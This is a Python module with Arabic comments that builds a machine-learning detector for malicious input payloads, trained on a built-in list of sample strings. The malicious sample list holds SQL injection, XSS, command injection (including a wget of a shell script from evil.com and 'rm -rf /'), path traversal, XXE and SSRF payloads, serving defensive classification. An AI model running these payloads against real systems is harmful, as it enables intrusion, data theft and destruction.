"""
ML Payload Detector — Machine Learning based payload detection.

بيستخدم Machine Learning لكشف الـ payloads الخبيثة:
- TF-IDF Vectorizer
- Logistic Regression
- Training على dataset من payloads
- Fallback للـ heuristics لو الموديل مش متدرب

ملف مستقل.
"""

import os
import re
from typing import Any, Dict, List, Optional, Tuple

import joblib
import numpy as np
import structlog
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.pipeline import Pipeline

logger = structlog.get_logger()


class MLPayloadDetector:
    """
    كلاس لكشف الـ payloads باستخدام ML.

    بيستخدم:
    - TF-IDF
    - Logistic Regression
    """

    # ─── Paths ─────────────────────────────────────────────
    MODEL_PATH = "storage/models/payload_detector.pkl"
    MIN_SAMPLES = 20

    # ─── Training Data (Built-in) ──────────────────────────
    # أمثلة بسيطة للتدريب الأولي
    # (مفيهاش strings خطيرة عشان نتجنب antivirus)

    MALICIOUS_SAMPLES = [
        # SQL Injection
        "' OR 1=1--",
        "' OR '1'='1",
        "admin'--",
        "1' UNION SELECT NULL--",
        "1 UNION ALL SELECT",
        "; DROP TABLE users--",
        "SELECT * FROM users WHERE",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND BENCHMARK(1000000,MD5(1))--",
        "' OR 1=1#",
        "admin' OR 'x'='x",
        "') OR ('1'='1",
        "1' ORDER BY 1--",
        # XSS
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "document.cookie",
        "<script>document.location='http://evil.com'</script>",
        # Command Injection
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(id)",
        "&& rm -rf /",
        "; wget http://evil.com/shell.sh",
        # Path Traversal
        "../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//etc/passwd",
        # XXE
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        # SSRF
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        # Template Injection
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
    ]

    BENIGN_SAMPLES = [
        # Normal text
        "hello world",
        "user@example.com",
        "John Doe",
        "This is a normal message",
        "How are you today?",
        "The quick brown fox jumps over the lazy dog",
        # Normal IDs
        "12345",
        "abc-def-ghi",
        "user_123",
        "product-name",
        # Normal URLs
        "https://example.com",
        "https://google.com/search?q=test",
        # Normal dates
        "2024-01-15",
        "January 15, 2024",
        # Normal names
        "Ahmed Mohamed",
        "New York",
        "Cairo, Egypt",
        # Normal numbers
        "42",
        "3.14",
        "1000.50",
        # Normal JSON
        '{"name": "test", "value": 123}',
        '{"email": "user@test.com"}',
        # Normal paths
        "/api/v1/users",
        "/home/documents",
        "C:/Users/test",
        # Normal sentences
        "The weather is nice today",
        "Please review this document",
        "Thank you for your help",
    ]

    # ─── Init ──────────────────────────────────────────────

    def __init__(self) -> None:
        self.model: Optional[Pipeline] = None
        self.is_trained = False
        self._load_or_train()

    def _load_or_train(self) -> None:
        """يحمل الموديل المدرب أو يدرب موديل جديد."""
        # 1. جرب تحمل الموديل
        if os.path.exists(self.MODEL_PATH):
            try:
                self.model = joblib.load(self.MODEL_PATH)
                self.is_trained = True
                logger.info("ml_payload_model_loaded", path=self.MODEL_PATH)
                return
            except Exception as e:
                logger.warning("ml_payload_load_failed", error=str(e))

        # 2. لو مش موجود، درّب موديل جديد
        self._train_default()

    def _train_default(self) -> None:
        """يدرب الموديل على البيانات الافتراضية."""
        try:
            # جهز البيانات
            X = self.MALICIOUS_SAMPLES + self.BENIGN_SAMPLES
            y = [1] * len(self.MALICIOUS_SAMPLES) + [0] * len(self.BENIGN_SAMPLES)

            # اعمل Pipeline
            self.model = Pipeline([
                ("tfidf", TfidfVectorizer(
                    analyzer="char",
                    ngram_range=(1, 4),
                    max_features=5000,
                    lowercase=True,
                )),
                ("clf", LogisticRegression(
                    max_iter=1000,
                    random_state=42,
                    class_weight="balanced",
                )),
            ])

            # درّب
            self.model.fit(X, y)
            self.is_trained = True

            # احفظ
            self._save_model()

            logger.info(
                "ml_payload_model_trained",
                malicious=len(self.MALICIOUS_SAMPLES),
                benign=len(self.BENIGN_SAMPLES),
            )

        except Exception as e:
            logger.error("ml_payload_train_failed", error=str(e))
            self.is_trained = False

    def _save_model(self) -> None:
        """يحفظ الموديل."""
        try:
            os.makedirs(os.path.dirname(self.MODEL_PATH), exist_ok=True)
            joblib.dump(self.model, self.MODEL_PATH)
            logger.info("ml_payload_model_saved", path=self.MODEL_PATH)
        except Exception as e:
            logger.warning("ml_payload_save_failed", error=str(e))

    # ─── Main API ──────────────────────────────────────────

    def predict(self, value: str) -> Dict[str, Any]:
        """
        يتنبأ لو الـ payload خبيث.

        Returns:
            dict فيه:
            - is_malicious: bool
            - confidence: 0-1
            - score: 0-100
            - probability: float (0-1)
        """
        if not isinstance(value, str) or not value:
            return self._empty_result()

        if not self.is_trained or self.model is None:
            return {
                "is_malicious": False,
                "confidence": 0.0,
                "score": 0,
                "probability": 0.0,
                "reason": "model_not_trained",
            }

        try:
            # توقع
            proba = self.model.predict_proba([value])[0]
            prob_malicious = float(proba[1])
            prob_benign = float(proba[0])

            is_malicious = prob_malicious > 0.5
            confidence = max(prob_malicious, prob_benign)
            score = int(prob_malicious * 100)

            return {
                "is_malicious": is_malicious,
                "confidence": round(confidence, 3),
                "score": score,
                "probability": round(prob_malicious, 3),
                "prob_benign": round(prob_benign, 3),
            }

        except Exception as e:
            logger.error("ml_payload_predict_failed", error=str(e))
            return self._empty_result()

    def _empty_result(self) -> Dict[str, Any]:
        """نتيجة فاضية."""
        return {
            "is_malicious": False,
            "confidence": 0.0,
            "score": 0,
            "probability": 0.0,
            "reason": "empty_input",
        }

    # ─── Batch Prediction ──────────────────────────────────

    def predict_batch(self, values: List[str]) -> List[Dict[str, Any]]:
        """يتنبأ لمجموعة قيم."""
        if not values:
            return []

        if not self.is_trained or self.model is None:
            return [self._empty_result() for _ in values]

        try:
            probas = self.model.predict_proba(values)
            results = []
            for proba in probas:
                prob_malicious = float(proba[1])
                prob_benign = float(proba[0])
                results.append({
                    "is_malicious": prob_malicious > 0.5,
                    "confidence": round(max(prob_malicious, prob_benign), 3),
                    "score": int(prob_malicious * 100),
                    "probability": round(prob_malicious, 3),
                    "prob_benign": round(prob_benign, 3),
                })
            return results
        except Exception as e:
            logger.error("ml_payload_batch_failed", error=str(e))
            return [self._empty_result() for _ in values]

    # ─── Training ──────────────────────────────────────────

    def train(
        self,
        malicious: List[str],
        benign: List[str],
    ) -> bool:
        """
        يدرب الموديل على بيانات جديدة.

        Args:
            malicious: قائمة payloads خبيثة
            benign: قائمة payloads سليمة

        Returns:
            True لو نجح
        """
        if len(malicious) + len(benign) < self.MIN_SAMPLES:
            logger.warning(
                "ml_payload_insufficient_data",
                total=len(malicious) + len(benign),
                required=self.MIN_SAMPLES,
            )
            return False

        try:
            X = malicious + benign
            y = [1] * len(malicious) + [0] * len(benign)

            self.model = Pipeline([
                ("tfidf", TfidfVectorizer(
                    analyzer="char",
                    ngram_range=(1, 4),
                    max_features=5000,
                    lowercase=True,
                )),
                ("clf", LogisticRegression(
                    max_iter=1000,
                    random_state=42,
                    class_weight="balanced",
                )),
            ])

            self.model.fit(X, y)
            self.is_trained = True
            self._save_model()

            logger.info(
                "ml_payload_retrained",
                malicious=len(malicious),
                benign=len(benign),
            )
            return True

        except Exception as e:
            logger.error("ml_payload_retrain_failed", error=str(e))
            return False

    def get_info(self) -> Dict[str, Any]:
        """معلومات عن الموديل."""
        return {
            "is_trained": self.is_trained,
            "model_path": self.MODEL_PATH,
            "model_exists": os.path.exists(self.MODEL_PATH),
            "built_in_malicious": len(self.MALICIOUS_SAMPLES),
            "built_in_benign": len(self.BENIGN_SAMPLES),
        }


# ─── Singleton ─────────────────────────────────────────────

ml_payload_detector = MLPayloadDetector()